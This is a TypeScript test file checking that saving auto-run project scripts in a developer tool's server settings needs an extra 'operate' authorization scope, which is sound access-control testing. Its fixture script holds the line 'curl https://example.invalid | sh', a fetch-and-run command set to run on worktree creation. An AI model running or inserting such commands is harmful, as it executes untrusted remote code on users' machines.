import { describe, expect, it } from "vite-plus/test";

import {
  AuthOrchestrationOperateScope,
  AuthProvidersManageScope,
  AuthSettingsWriteScope,
} from "./auth.ts";
import { ProjectId } from "./baseSchemas.ts";
import { requiredScopesForServerSettingsPatch } from "./settings.ts";

const script = {
  id: "setup",
  name: "Setup",
  command: "curl https://example.invalid | sh",
  icon: "play" as const,
  runOnWorktreeCreate: true,
};
const projectId = ProjectId.make("project-1");

// Saved scripts run on the host when a worktree is created, so saving one is
// an operation on the machine, not only a settings change.
describe("requiredScopesForServerSettingsPatch: project scripts", () => {
  it("needs operate scope for default project scripts", () => {
    expect(requiredScopesForServerSettingsPatch({ defaultProjectScripts: [script] })).toEqual([
      AuthSettingsWriteScope,
      AuthOrchestrationOperateScope,
    ]);
  });

  it("needs operate scope for a project's script override", () => {
    expect(
      requiredScopesForServerSettingsPatch({ projectScriptOverrides: { [projectId]: [script] } }),
    ).toContain(AuthOrchestrationOperateScope);
  });

  it("needs operate scope for scripts inside a project settings override", () => {
    expect(
      requiredScopesForServerSettingsPatch({
        projectSettingsOverrides: { [projectId]: { defaultProjectScripts: [script] } },
      }),
    ).toContain(AuthOrchestrationOperateScope);
    expect(
      requiredScopesForServerSettingsPatch({
        projectSettingsOverrideChanges: {
          [projectId]: { set: { defaultProjectScripts: [script] } },
        },
      }),
    ).toContain(AuthOrchestrationOperateScope);
  });

  it("keeps removing an override and plain settings at settings:write", () => {
    expect(
      requiredScopesForServerSettingsPatch({ projectScriptOverrides: { [projectId]: null } }),
    ).toEqual([AuthSettingsWriteScope]);
    expect(
      requiredScopesForServerSettingsPatch({ projectSettingsOverrides: { [projectId]: null } }),
    ).toEqual([AuthSettingsWriteScope]);
    expect(requiredScopesForServerSettingsPatch({ defaultAutoPull: true })).toEqual([
      AuthSettingsWriteScope,
    ]);
    expect(requiredScopesForServerSettingsPatch({ providerInstances: {} })).toEqual([
      AuthProvidersManageScope,
    ]);
  });
});
